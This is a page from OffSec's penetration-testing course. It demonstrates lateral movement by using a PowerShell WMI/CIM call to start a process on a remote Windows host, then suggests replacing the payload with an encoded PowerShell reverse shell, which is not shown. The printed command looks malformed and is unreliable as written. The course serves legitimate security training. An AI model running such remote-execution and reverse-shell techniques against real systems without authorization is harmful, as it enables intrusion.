# OffSec

Penetration Testing with Kali Linux

```
PS C:\Users\jeff\> Invoke-CimSession -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @($CommandLine=$Command);

```

```
ProcessId ReturnValue PSComputerName
-------------------------------------------------
3712 0 192.168.50.73
```

Listing 829 - Examining the WMI PowerShell payload.

Verifying the active processes on the target machine reveals that a new calculator process has launched, confirming that our attack has succeeded.

![](bbox=[0.118, 0.253, 0.882, 0.755])

Figure 284: Inspecting The Task Manager

To improve our craft, we could replace the previous payload with a full reverse shell written in PowerShell.

First, we will encode the PowerShell reverse shell so we don't need to expose any characters when inserting it as a WMI payload.

PWK - Copyright 2023 OffSec Services Limited. All rights reserved.

780